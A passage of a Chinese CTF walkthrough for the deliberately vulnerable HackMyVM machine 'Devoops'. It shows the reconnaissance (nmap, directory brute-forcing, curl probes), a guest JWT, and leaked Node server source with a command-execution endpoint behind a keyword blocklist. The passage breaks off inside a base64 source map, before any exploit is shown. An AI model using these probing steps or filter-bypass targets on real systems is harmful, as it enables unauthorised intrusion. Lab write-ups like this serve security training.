# hackmyvm_Devoops

 

```shell
大佬WP：
https://www.bilibili.com/video/BV1HhLozpEk5
https://pepster.me/Temp-DevOops-Walkthrough/
2020：DevOops 设计思路.pdf
```



### 1. 基本信息

```
靶机链接：
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=Devoops
```

```shell
难度：⭐️⭐️⭐️
知识点：信息收集，`jwt`使用，`Vite[CVE-2025-30208]`任意文件读取，`gitea`服务，`git log`看日志，`socat`端口转发，私钥，`arp`提权
```

### 2. 信息收集

### Nmap

```shell
└─# arp-scan -l | grep PCS
192.168.31.25   08:00:27:b3:d9:97       PCS Systemtechnik GmbH
└─# IP=192.168.31.25
└─# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-29 22:16 CST
Nmap scan report for devoops (192.168.31.25)
Host is up (0.0014s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, NCP, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest:
|     HTTP/1.1 403 Forbidden
|     Vary: Origin
|     Content-Type: text/plain
|     Date: Thu, 29 May 2025 14:16:15 GMT
|     Connection: close
|     Blocked request. This host (undefined) is not allowed.
|     allow this host, add undefined to `server.allowedHosts` in vite.config.js.
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 204 No Content
|     Vary: Origin, Access-Control-Request-Headers
|     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
|     Content-Length: 0
|     Date: Thu, 29 May 2025 14:16:15 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=5/29%Time=68386C31%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,FE,"HTTP/1\.1\x20403\x20Forbidden\r\nVary:\x20Origin\r\nConten
SF:t-Type:\x20text/plain\r\nDate:\x20Thu,\x2029\x20May\x202025\x2014:16:15
SF:\x20GMT\r\nConnection:\x20close\r\n\r\nBlocked\x20request\.\x20This\x20
SF:host\x20\(undefined\)\x20is\x20not\x20allowed\.\nTo\x20allow\x20this\x2
SF:0host,\x20add\x20undefined\x20to\x20`server\.allowedHosts`\x20in\x20vit
SF:e\.config\.js\.")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n
SF:")%r(NCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(HTTPOptions
SF:,D2,"HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Access-Co
SF:ntrol-Request-Headers\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,PUT,
SF:PATCH,POST,DELETE\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2029\x20May
SF:\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPReq
SF:uest,D2,"HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Acces
SF:s-Control-Request-Headers\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,
SF:PUT,PATCH,POST,DELETE\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2029\x2
SF:0May\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RPC
SF:Check,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(DNSVersionBind
SF:ReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(DNSStatusRequ
SF:estTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLSessionReq
SF:,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServerCooki
SF:e,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSessionReq,1C,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\n\r\n")%r(FourOhFourRequest,FE,"HTTP/1\.1\x20403\x20Forbidden\r\n
SF:Vary:\x20Origin\r\nContent-Type:\x20text/plain\r\nDate:\x20Thu,\x2029\x
SF:20May\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\nBlocked
SF:\x20request\.\x20This\x20host\x20\(undefined\)\x20is\x20not\x20allowed\
SF:.\nTo\x20allow\x20this\x20host,\x20add\x20undefined\x20to\x20`server\.a
SF:llowedHosts`\x20in\x20vite\.config\.js\.");
MAC Address: 08:00:27:B3:D9:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

只开放了`3000`口，尝试访问一下，一个示例页面，讲述如何创建一个` Vue.js + Express.js `的前后端分离项目,`vue.js`的新手指南

### 目录扫描

```shell
└─# dirsearch -u http://$IP:3000  -x 403 -e txt,php,html
[22:16:55] 200 -  302B  - /.flac
[22:16:55] 200 -  301B  - /.gif
[22:16:55] 200 -  301B  - /.ico
[22:16:55] 200 -  302B  - /.jpeg
[22:16:55] 200 -  301B  - /.jpg
[22:16:56] 200 -  301B  - /.mp3
[22:16:56] 200 -  301B  - /.pdf
[22:16:56] 200 -  301B  - /.png
[22:16:57] 200 -  301B  - /.txt
[22:17:07] 404 -    0B  - /favicon.ico
[22:17:13] 200 -  385B  - /README.md
[22:17:14] 200 -   21KB - /server
[22:17:14] 200 -   21KB - /server.js
└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP:3000 -x.txt,.php,.html --exclude-length 414
/.txt                 (Status: 200) [Size: 301]
/server               (Status: 200) [Size: 21764]
/sign                 (Status: 200) [Size: 189]
/execute              (Status: 401) [Size: 48]
/.txt                 (Status: 200) [Size: 301]
```

`gobuster`可以发现几个有用的路径`/execute、/sign、/server.js`挨个请求一下看看

```
└─# curl http://$IP:3000/sign
{"status":"signed","data":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg1Mjg3NjIsImV4cCI6MTc0ODUzMDU2Mn0.F8hwKtxcpYq9Hgm0w-AoiZQT1sqb69kwMTN4l_768z0"}

└─# curl http://$IP:3000/execute
{"status":"rejected","data":"permission denied"}

└─# curl http://$IP:3000/server.js
import __vite__cjsImport0_express from "/node_modules/.vite/deps/express.js?v=8bc9628c"; const express = __vite__cjsImport0_express.__esModule ? __vite__cjsImport0_express.default : __vite__cjsImport0_express;
import __vite__cjsImport1_jsonwebtoken from "/node_modules/.vite/deps/jsonwebtoken.js?v=8bc9628c"; const jwt = __vite__cjsImport1_jsonwebtoken.__esModule ? __vite__cjsImport1_jsonwebtoken.default : __vite__cjsImport1_jsonwebtoken;
import "/node_modules/.vite/deps/dotenv_config.js?v=8bc9628c"
import __vite__cjsImport3_child_process from "/@id/__vite-browser-external:child_process"; const exec = __vite__cjsImport3_child_process["exec"];
import __vite__cjsImport4_util from "/@id/__vite-browser-external:util"; const promisify = __vite__cjsImport4_util["promisify"];

const app = express();

const address = 'localhost';
const port = 3001;

const exec_promise = promisify(exec);

const COMMAND_FILTER = process.env.COMMAND_FILTER
    ? process.env.COMMAND_FILTER.split(',')
        .map(cmd => cmd.trim().toLowerCase())
        .filter(cmd => cmd !== '')
    : [];

app.use(express.json());

function is_safe_command(cmd) {
    if (!cmd || typeof cmd !== 'string') {
        return false;
    }
    if (COMMAND_FILTER.length === 0) {
        return false;
    }

    const lower_cmd = cmd.toLowerCase();

    for (const forbidden of COMMAND_FILTER) {
        const regex = new RegExp(`\\b${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b|^${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i');
        if (regex.test(lower_cmd)) {
            return false;
        }
    }

    if (/[;&|]/.test(cmd)) {
        return false;
    }
    if (/[<>]/.test(cmd)) {
        return false;
    }
    if (/[`$()]/.test(cmd)) {
        return false;
    }

    return true;
}

async function execute_command_sync(command) {
    try {
        const { stdout, stderr } = await exec_promise(command);

        if (stderr) {
            return { status: false, data: { stdout, stderr } };
        }
        return { status: true, data: { stdout, stderr } };
    } catch (error) {
        return { status: true, data: error.message };
    }
}

app.get('/', (req, res) => {
    return res.json({
        'status': 'working',
        'data': `listening on http://${address}:${port}`
    })
})

app.get('/api/sign', (req, res) => {
    return res.json({
        'status': 'signed',
        'data': jwt.sign({
            uid: -1,
            role: 'guest',
        }, process.env.JWT_SECRET, { expiresIn: '1800s' }),
    });
});

app.get('/api/execute', async (req, res) => {
    const authorization_header_raw = req.headers['authorization'];
    if (!authorization_header_raw || !authorization_header_raw.startsWith('Bearer ')) {
        return res.status(401).json({
            'status': 'rejected',
            'data': 'permission denied'
        });
    }

    const jwt_raw = authorization_header_raw.split(' ')[1];

    try {
        const payload = jwt.verify(jwt_raw, process.env.JWT_SECRET);
        if (payload.role !== 'admin') {
            return res.status(403).json({
                'status': 'rejected',
                'data': 'permission denied'
            });
        }
    } catch (err) {
        return res.status(401).json({
            'status': 'rejected',
            'data': `permission denied`
        });
    }

    const command = req.query.cmd;

    const is_command_safe = is_safe_command(command);
    if (!is_command_safe) {
        return res.status(401).json({
            'status': 'rejected',
            'data': `this command is unsafe`
        });
    }

    const result = await execute_command_sync(command);

    return res.json({
        'status': result.status === true ? 'executed' : 'failed',
        'data': result.data
    })
});

app.listen(port, address, () => {
    console.log(`Listening on http://${address}:${port}`)
});

//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNlcnZlci5qcyJdLCJzb3VyY2VzQ29udGVudCI6WyJpbXBvcnQgX192aXRlX19janNJbXBvcnQwX2V4cHJlc3MgZnJvbSBcIi9ub2RlX21vZHVsZXMvLnZpdGUvZGVwcy9leHByZXNzLmpzP3Y9OGJjOTYyOGNcIjsgY29uc3QgZXhwcmVzcyA9IF9fdml0ZV9fY2pzSW1wb3J0MF9leHByZXNzLl9fZXNNb2R1bGUgPyBfX3ZpdGVfX2Nqc0ltcG9ydDBfZXhwcmVzcy5kZWZhdWx0IDogX192aXRlX19janNJbXBvcnQwX2V4cHJlc3M7XG5pbXBvcnQgX192aXRlX19janNJbXBvcnQxX2pzb253ZWJ0b2tlbiBmcm9tIFwiL25vZGVfbW9kdWxlcy8udml0ZS9kZXBzL2pzb253ZWJ0b2tlbi5qcz92PThiYzk2MjhjXCI7IGNvbnN0IGp3dCA9IF9fdml0ZV9fY2pzSW1wb3J0MV9qc29ud2VidG9rZW4uX19lc01vZHVsZSA/IF9fdml0ZV9fY2pzSW1wb3J0MV9qc29ud2VidG9rZW4uZGVmYXVsdCA6IF9fdml0ZV9fY2pzSW1wb3J0MV9qc29ud2VidG9rZW47XG5pbXBvcnQgXCIvbm9kZV9tb2R1bGVzLy52aXRlL2RlcHMvZG90ZW52X2NvbmZpZy5qcz92PThiYzk2MjhjXCJcbmltcG9ydCBfX3ZpdGVfX2Nqc0ltcG9ydDNfY2hpbGRfcHJvY2VzcyBmcm9tIFwiL0BpZC9fX3ZpdGUtYnJvd3Nlci1leHRlcm5hbDpjaGlsZF9wcm9jZXNzXCI7IGNvbnN0IGV4ZWMgPSBfX3ZpdGVfX2Nqc0ltcG9ydDNfY2hpbGRfcHJvY2Vzc1tcImV4ZWNcIl07XG5pbXBvcnQgX192aXRlX19janNJbXBvcnQ0X3V0aWwgZnJvbSBcIi9AaWQvX192aXRlLWJyb3dzZXItZXh0ZXJuYWw6dXRpbFwiOyBjb25zdCBwcm9taXNpZnkgPSBfX3ZpdGVfX2Nqc0ltcG9ydDRfdXRpbFtcInByb21pc2lmeVwiXTtcblxuY29uc3QgYXBwID0gZXhwcmVzcygpO1xuXG5jb25zdCBhZGRyZXNzID0gJ2xvY2FsaG9zdCc7XG5jb25zdCBwb3J0ID0gMzAwMTtcblxuY29uc3QgZXhlY19wcm9taXNlID0gcHJvbWlzaWZ5KGV4ZWMpO1xuXG5jb25zdCBDT01NQU5EX0ZJTFRFUiA9IHByb2Nlc3MuZW52LkNPTU1BTkRfRklMVEVSXG4gICAgPyBwcm9jZXNzLmVudi5DT01NQU5EX0ZJTFRFUi5zcGxpdCgnLCcpXG4gICAgICAgIC5tYXAoY21kID0+IGNtZC50cmltKCkudG9Mb3dlckNhc2UoKSlcbiAgICAgICAgLmZpbHRlcihjbWQgPT4gY21kICE9PSAnJylcbiAgICA6IFtdO1xuXG5hcHAudXNlKGV4cHJlc3MuanNvbigpKTtcblxuZnVuY3Rpb24gaXNfc2FmZV9jb21tYW5kKGNtZCkge1xuICAgIGlmICghY21kIHx8IHR5cGVvZiBjbWQgIT09ICdzdHJpbmcnKSB7XG4gICAgICAgIHJldHVybiBmYWxzZTtcbiAgICB9XG4gICAgaWYgKENPTU1BTkRfRklMVEVSLmxlbmd0aCA9PT0gMCkge1xuICAgICAgICByZXR1cm4gZmFsc2U7XG4gICAgfVxuXG4gICAgY29uc3QgbG93ZXJfY21kID0gY21kLnRvTG93ZXJDYXNlKCk7XG5cbiAgICBmb3IgKGNvbnN0IGZvcmJpZGRlbiBvZiBDT01NQU5EX0ZJTFRFUikge1xuICAgICAgICBjb25zdCByZWdleCA9IG5ldyBSZWdFeHAoYFxcXFxiJHtmb3JiaWRkZW4ucmVwbGFjZSgvWy4qKz9eJHt9KCl8W1xcXVxcXFxdL2csICdcXFxcJCYnKX1cXFxcYnxeJHtmb3JiaWRkZW4ucmVwbGFjZSgvWy4qKz9eJHt9KCl8W1xcXVxcXFxdL2csICdcXFxcJCYnKX0kYCwgJ2knKTtcbiAgICAgICAgaWYgKHJlZ2V4LnRlc3QobG93ZXJfY21kKSkge1xuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgaWYgKC9bOyZ8XS8udGVzdChjbWQpKSB7XG4gICAgICAgIHJldHVybiBmYWxzZTtcbiAgICB9XG4gICAgaWYgKC9bPD5dLy50ZXN0KGNtZCkpIHtcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xuICAgIH1cbiAgICBpZiAoL1tgJCgpXS8udGVzdChjbWQpKSB7XG4gICAgICAgIHJldHVybiBmYWxzZTtcbiAgICB9XG5cbiAgICByZXR1cm4gdHJ1ZTtcbn1cblxuYXN5bmMgZnVuY3Rpb24gZXhlY3V0ZV9jb21tYW5kX3N5bmMoY29tbWFuZCkge1xuICAgIHRyeSB7XG4gICAgICAgIGNvbnN0IHsgc3Rkb3V0LCBzdGRlcnIgfSA9IGF3YWl0IGV4ZWNfcHJvbWlzZShjb21tYW5kKTtcblxuICAgICAgICBpZiAoc3RkZXJyKSB7XG4gICAgICAgICAgICByZXR1cm4geyBzdGF0dXM6IGZhbHNlLCBkYXRhOiB7IHN0ZG91dCwgc3RkZXJyIH0gfTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4geyBzdGF0dXM6IHRydWUsIGRhdGE6IHsgc3Rkb3V0LCBzdGRlcnIgfSB9O1xuICAgIH0gY2F0Y2ggKGVycm9yKSB7XG4gICAgICAgIHJldHVybiB7IHN0YXR1czogdHJ1ZSwgZGF0YTogZXJyb3IubWVzc2FnZSB9O1xuICAgIH1cbn1cblxuYXBwLmdldCgnLycsIChyZXEsIHJlcykgPT4ge1xuICAgIHJldHVybiByZXMuanNvbih7XG4gICAgICAgICdzdGF0dXMnOiAnd29ya2luZycsXG4gICAgICAgICdkYXRhJzogYGxpc3RlbmluZyBvbiBodHRwOi8vJHthZGRyZXNzfToke3BvcnR9YFxuICAgIH0pXG59KVxuXG5hcHAuZ2V0KCcvYXBpL3NpZ24nLCAocmVxLCByZXMpID0+IHtcbiAgICByZXR1cm4gcmVzLmpzb24oe1xuICAgICAgICAnc3RhdHVzJzogJ3NpZ25lZCcsXG4gICAgICAgICdkYXRhJzogand0LnNpZ24oe1xuICAgICAgICAgICAgdWlkOiAtMSxcbiAgICAgICAgICAgIHJvbGU6ICdndWVzdCcsXG4gICAgICAgIH0sIHByb2Nlc3MuZW52LkpXVF9TRUNSRVQsIHsgZXhwaXJlc0luOiAnMTgwMHMnIH0pLFxuICAgIH0pO1xufSk7XG5cbmFwcC5nZXQoJy9hcGkvZXhlY3V0ZScsIGFzeW5jIChyZXEsIHJlcykgPT4ge1xuICAgIGNvbnN0IGF1dGhvcml6YXRpb25faGVhZGVyX3JhdyA9IHJlcS5oZWFkZXJzWydhdXRob3JpemF0aW9uJ107XG4gICAgaWYgKCFhdXRob3JpemF0aW9uX2hlYWRlcl9yYXcgfHwgIWF1dGhvcml6YXRpb25faGVhZGVyX3Jhdy5zdGFydHNXaXRoKCdCZWFyZXIgJykpIHtcbiAgICAgICAgcmV0dXJuIHJlcy5zdGF0dXMoNDAxKS5qc29uKHtcbiAgICAgICAgICAgICdzdGF0dXMnOiAncmVqZWN0ZWQnLFxuICAgICAgICAgICAgJ2RhdGEnOiAncGVybWlzc2lvbiBkZW5pZWQnXG4gICAgICAgIH0pO1xuICAgIH1cblxuICAgIGNvbnN0IGp3dF9yYXcgPSBhdXRob3JpemF0aW9uX2hlYWRlcl9yYXcuc3BsaXQoJyAnKVsxXTtcblxuICAgIHRyeSB7XG4gICAgICAgIGNvbnN0IHBheWxvYWQgPSBqd3QudmVyaWZ5KGp3dF9yYXcsIHByb2Nlc3MuZW52LkpXVF9TRUNSRVQpO1xuICAgICAgICBpZiAocGF5bG9hZC5yb2xlICE9PSAnYWRtaW4nKSB7XG4gICAgICAgICAgICByZXR1cm4gcmVzLnN0YXR1cyg0MDMpLmpzb24oe1xuICAgICAgICAgICAgICAgICdzdGF0dXMnOiAncmVqZWN0ZWQnLFxuICAgICAgICAgICAgICAgICdkYXRhJzogJ3Blcm1pc3Npb24gZGVuaWVkJ1xuICAgICAgICAgICAgfSk7XG4gICAgICAgIH1cbiAgICB9IGNhdGNoIChlcnIpIHtcbiAgICAgICAgcmV0dXJuIHJlcy5zdGF0dXMoNDAxKS5qc29uKHtcbiAgICAgICAgICAgICdzdGF0dXMnOiAncmVqZWN0ZWQnLFxuICAgICAgICAgICAgJ2RhdGEnOiBgcGVybWlzc2lvbiBkZW5pZWRgXG4gICAgICAgIH0pO1xuICAgIH1cblxuICAgIGNvbnN0IGNvbW1hbmQgPSByZXEucXVlcnkuY21kO1xuXG4gICAgY29uc3QgaXNfY29tbWFuZF9zYWZlID0gaXNfc2FmZV9jb21tYW5kKGNvbW1hbmQpO1xuICAgIGlmICghaXNfY29tbWFuZF9zYWZlKSB7XG4gICAgICAgIHJldHVybiByZXMuc3RhdHVzKDQwMSkuanNvbih7XG4gICAgICAgICAgICAnc3RhdHVzJzogJ3JlamVjdGVkJyxcbiAgICAgICAgICAgICdkYXRhJzogYHRoaXMgY29tbWFuZCBpcyB1bnNhZmVgXG4gICAgICAgIH0pO1xuICAgIH1cblxuICAgIGNvbnN0IHJlc3VsdCA9IGF3YWl0IGV4ZWN1dGVfY29tbWFuZF9zeW5jKGNvbW1hbmQpO1xuXG4gICAgcmV0dXJuIHJlcy5qc29uKHtcbiAgICAgICAgJ3N0YXR1cyc6IHJlc3VsdC5zdGF0dXMgPT09IHRydWUgPyAnZXhlY3V0ZWQnIDogJ2ZhaWxlZCcsXG4gICAgICAgICdkYXRhJzogcmVzdWx0LmRhdGFcbiAgICB9KVxufSk7XG5cbmFwcC5saXN0ZW4ocG9ydCwgYWRkcmVzcywgKCkgPT4ge1xuICAgIGNvbnNvbGUubG9nKGBMaXN0ZW5pbmcgb24gaHR0cDovLyR7YWRkcmVzc306JHtwb3J0fWApXG59KTtcbiJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQSxNQUFNLENBQUMsMEJBQTBCLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxZQUFZLENBQUMsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLE9BQU8sQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDLFFBQVEsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLE9BQU8sQ0FBQyxDQUFDLENBQUMsMEJBQTBCLENBQUMsVUFBVSxDQUFDLENBQUMsQ0FBQywwQkFBMEIsQ0FBQyxPQUFPLENBQUMsQ0FBQyxDQUFDLDBCQUEwQjtBQUNoTixNQUFNLENBQUMsK0JBQStCLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxZQUFZLENBQUMsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLFlBQVksQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDLFFBQVEsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsK0JBQStCLENBQUMsVUFBVSxDQUFDLENBQUMsQ0FBQywrQkFBK0IsQ0FBQyxPQUFPLENBQUMsQ0FBQyxDQUFDLCtCQUErQjtBQUNyTyxNQUFNLENBQUMsQ0FBQyxDQUFDLFlBQVksQ0FBQyxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsYUFBYSxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUMsUUFBUTtBQUM1RCxNQUFNLENBQUMsZ0NBQWdDLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsT0FBTyxDQUFDLFFBQVEsQ0FBQyxhQUFhLENBQUMsQ0FBQyxDQUFDLEtBQUssQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLGdDQUFnQyxDQUFDLENBQUMsSUFBSSxDQUFDLENBQUM7QUFDaEosTUFBTSxDQUFDLHVCQUF1QixDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLE9BQU8sQ0FBQyxRQUFRLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxLQUFLLENBQUMsU0FBUyxDQUFDLENBQUMsQ0FBQyx1QkFBdUIsQ0FBQyxDQUFDLFNBQVMsQ0FBQyxDQUFDOztBQUUvSCxLQUFLLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxPQUFPLENBQUMsQ0FBQzs7QUFFckIsS0FBSyxDQUFDLE9BQU8sQ0FBQyxDQUFDLENBQUMsQ0FBQyxTQUFTLENBQUM7QUFDM0IsS0FBSyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsSUFBSTs7QUFFakIsS0FBSyxDQUFDLFlBQVksQ0FBQyxDQUFDLENBQUMsU0FBUyxDQUFDLElBQUksQ0FBQzs7QUFFcEMsS0FBSyxDQUFDLGNBQWMsQ0FBQyxDQUFDLENBQUMsT0FBTyxDQUFDLEdBQUcsQ0FBQztBQUNuQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxPQUFPLENBQUMsR0FBRyxDQUFDLGNBQWMsQ0FBQyxLQUFLLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDMUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxXQUFXLENBQUMsQ0FBQztBQUM1QyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUNqQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7O0FBRVIsR0FBRyxDQUFDLEdBQUcsQ0FBQyxPQUFPLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQzs7QUFFdkIsUUFBUSxDQUFDLGVBQWUsQ0FBQyxHQUFHLENBQUMsQ0FBQztBQUM5QixDQUFDLENBQUMsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUM7QUFDekMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxLQUFLO0FBQ3BCLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDSixDQUFDLENBQUMsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLGNBQWMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUNyQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLEtBQUs7QUFDcEIsQ0FBQyxDQUFDLENBQUMsQ0FBQzs7QUFFSixDQUFDLENBQUMsQ0FBQyxDQUFDLEtBQUssQ0FBQyxTQUFTLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxXQUFXLENBQUMsQ0FBQzs7QUFFdkMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxLQUFLLENBQUMsU0FBUyxDQUFDLEVBQUUsQ0FBQyxjQUFjLENBQUMsQ0FBQztBQUM1QyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLEtBQUssQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxTQUFTLENBQUMsT0FBTyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxTQUFTLENBQUMsT0FBTyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ3hKLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUMsQ0FBQyxLQUFLLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxDQUFDLENBQUM7QUFDbkMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLEtBQUs7QUFDeEIsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ1IsQ0FBQyxDQUFDLENBQUMsQ0FBQzs7QUFFSixDQUFDLENBQUMsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQztBQUMzQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLEtBQUs7QUFDcEIsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUNKLENBQUMsQ0FBQyxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQztBQUMxQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLEtBQUs7QUFDcEIsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUNKLENBQUMsQ0FBQyxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsSUFBSSxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUM7QUFDNUIsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxLQUFLO0FBQ3BCLENBQUMsQ0FBQyxDQUFDLENBQUM7O0FBRUosQ0FBQyxDQUFDLENBQUMsQ